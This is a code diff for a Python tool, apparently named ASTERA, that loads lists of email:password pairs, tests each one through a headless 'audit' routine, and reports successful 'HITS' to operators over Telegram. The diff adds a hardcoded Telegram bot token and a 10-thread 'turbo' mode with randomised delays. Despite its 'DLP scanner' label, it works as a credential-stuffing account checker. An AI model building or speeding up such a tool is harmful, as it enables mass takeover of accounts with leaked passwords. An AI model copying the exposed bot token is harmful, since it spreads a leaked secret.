@@ -5,6 +5,7 @@ import threading
 import base64
 import requests
 import asyncio
+import concurrent.futures
 import random
 import json
 from urllib.parse import urlparse
@@ -85,7 +86,30 @@ def process_file_and_scan(file_path, target_notif_chat=None, target_user_filter=
         print("❌ Error: No se encontraron credenciales válidas.")
         return
         
+
     print(f"✅ Procesando {len(valid_creds)} objetivos en background...")
+    
+    # 🔥 AVISO INICIAL A TELEGRAM
+    try:
+        from server import get_db_conn, q
+        conn = get_db_conn()
+        cur = conn.cursor()
+        if target_user_filter:
+            cur.execute(q("SELECT telegram_chat_id FROM users WHERE username = ?"), (target_user_filter,))
+        else:
+            cur.execute(q("SELECT telegram_chat_id FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''"))
+        users = cur.fetchall()
+        conn.close()
+        
+        token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
+        for row in users:
+            cid = row[0]
+            msg = f"📥 *NUEVO ARCHIVO DETECTADO*\nSe encontró un archivo con `{len(valid_creds)}` correos en ASTERA.\n\n⚡ _Iniciando Escáner DLP Turbo...\nTe notificaré los HITS cuando termine._"
+            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
+                          json={"chat_id": cid, "text": msg, "parse_mode": "Markdown"})
+    except Exception as e:
+        print(f"Error alerting start: {e}")
+
     
     # 3. Import and Trigger run_audit Headlessly
     sys.path.append(os.path.dirname(os.path.abspath(__file__)))
@@ -97,7 +121,7 @@ def process_file_and_scan(file_path, target_notif_chat=None, target_user_filter=
         
     dummy_q = DummyQueue()
     
-    for cred in valid_creds:
+    def scan_cred(cred):
         email, pwd = cred.split(':', 1)
         try:
             # We pass multi_user=True, the hit_buffer and the user filter
@@ -105,8 +129,12 @@ def process_file_and_scan(file_path, target_notif_chat=None, target_user_filter=
         except Exception as e:
             print(f"Error scanning {email}: {e}")
         
-        # 'Tiempo al tiempo' - delay between credentials
+        # 'Tiempo al tiempo' - slight delay between threads
         time.sleep(random.uniform(0.5, 1.2))
+
+    # 🔥 TURBO MODE: 10 hilos en paralelo
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+        executor.map(scan_cred, valid_creds)
             
     print(f"🏁 Auditoría de {len(valid_creds)} objetivos finalizada.")
 
@@ -403,6 +431,7 @@ async def main():
 
 
 import asyncio
+import concurrent.futures
 
 if __name__ == '__main__':
     try:
